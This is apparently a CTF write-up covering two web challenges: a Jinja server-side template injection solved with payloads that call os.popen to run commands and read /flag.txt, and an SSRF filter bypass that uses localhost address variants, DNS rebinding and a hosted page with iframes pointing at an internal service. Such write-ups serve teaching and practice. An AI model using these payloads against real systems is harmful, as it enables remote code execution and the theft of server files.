---
layout: post
title:  "Web Challenges"
date:   2026-05-17 20:54:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /RAMunchers-CTF-2026-web/
---
* TOC
{:toc}

## SSTI

**Author**: not given

**Description**: We're curious at what your favourite ai model is, you can even choose your own. [https://ctf.ramunchers.com/engine/challenge/20](https://ctf.ramunchers.com/engine/challenge/20). Port 5000

I go to the site:
{% raw %}
![Alt text](/images/ramunchersweb1.png)

You can select other models but the part where we control input is interesting. I test for SSTI with `{{7*7}}` and see this:

![Alt text](/images/ramunchersweb2.png)

Good! I know basic SSTI is working. By sending a broken payload on purpose I can confirm it is executing Jinja expressions. 

Then I test the payload `{{ cycler.__init__.__globals__.os.popen('id').read() }}` and see this:

![Alt text](/images/ramunchersweb3.png)

This confirms RCE!

I get the flag with this payload:
```shell
{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

![Alt text](/images/ramunchersweb4.png)

`RAM{ins3cure_dr0pdown}`
{% endraw %}
___

## PDFify

**Author**: not given

**Description**: PDFify is an internal document generation service. You give it a URL, it fetches the page and renders a PDF preview. The flag is on the server. Find it. [https://ctf.ramunchers.com/engine/challenge/15](https://ctf.ramunchers.com/engine/challenge/15). Its a web service so on port 80

I go to the site:

![Alt text](/images/ramunchersweb6.png)

I find these comments in the html:
```html
<!-- TODO: remove debug endpoints before production push --> 
<!-- internal metrics service available on port 3000 (localhost only) -->
```

Every attempt I make at SSRF by submitting something like `http://127.0.0.1:3000` is blocked:

![Alt text](/images/ramunchersweb7.png)

I tried to submit different links in order to bypass the filter like:
```shell
http://127.0.0.1:3000
http://2130706433:3000
http://0x7f000001:3000
http://127.1:3000
http://0:3000
http://127.1:3000
http://0.0.0.0:3000
```
All were blocked.

I went to [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) and generated a link  like this: `http://01020304.7f000001.rbndr.us`. 

Sometimes it resolves `1.2.3.4` and generates a pdf containing the current page. Sometimes it would resolve `127.0.0.1` and get blocked.

It should be easier to host our own html. I went to [https://tiiny.host/](https://tiiny.host/) and made an account. Then I hosted an html file containing this:
```html
<html>
<body>
    <h1>Looking for flag...</h1>
    <iframe src="http://127.0.0.1:3000/flag.txt" width="800px" height="600px"></iframe>
    <object data="http://localhost:3000/flag.txt" width="800px" height="600px"></object>
</body>
</html>
```

Then I get my link at `http://teal-jannel-57.tiiny.site`. Submit the link and get the flag:

![Alt text](/images/ramunchersweb5.png)

`RAM{dns_r3b1nd_t0ctou_D1u4le_A_R3cord}`
